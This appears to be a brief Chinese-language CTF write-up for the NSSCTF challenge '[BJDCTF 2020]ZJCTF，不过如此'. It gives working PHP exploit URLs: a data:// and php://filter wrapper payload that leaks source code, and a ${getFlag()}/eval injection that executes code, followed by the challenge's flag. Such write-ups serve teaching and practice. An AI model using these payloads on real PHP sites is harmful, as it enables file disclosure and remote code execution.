### [BJDCTF 2020]ZJCTF，不过如此

[BJDCTF 2020\]ZJCTF，不过如此 | NSSCTF](https://www.nssctf.cn/problem/717)

![image](https://github.com/user-attachments/assets/1e646859-91f6-4af0-aa59-d81ad693ab24)

涉及到php

先看题目

![image](https://github.com/user-attachments/assets/d71f169c-2b6f-46d6-8cfd-648eb3017002)

> [!TIP]
 需要读取text的内容是否为I have a dream，且file参数里面不能含有flag

#### 构造使用php伪协议进行读取

```
/?text=data://plain/text,I%20have%20a%20dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

得到base64

![image](https://github.com/user-attachments/assets/8c9c4b79-1029-4511-80ce-4a98ec62744d)

进行解码

![image](https://github.com/user-attachments/assets/1f687ddc-8590-4cd9-9dad-aae77af401de)

#### 发现命令执行漏洞：@eval($_GET[‘cmd’]);

```
/next.php?\S*=${getFlag()}&&cmd=phpinfo();
```

![image](https://github.com/user-attachments/assets/7c6bfb87-5a77-4728-9387-493e66405f0f)
#### Ctrl+G搜索flag

![image](https://github.com/user-attachments/assets/05e8b16d-8322-433b-96e0-5647d9ce7476)

**NSSCTF{453a61d6-6601-4a35-bc99-2090d2f0a749}**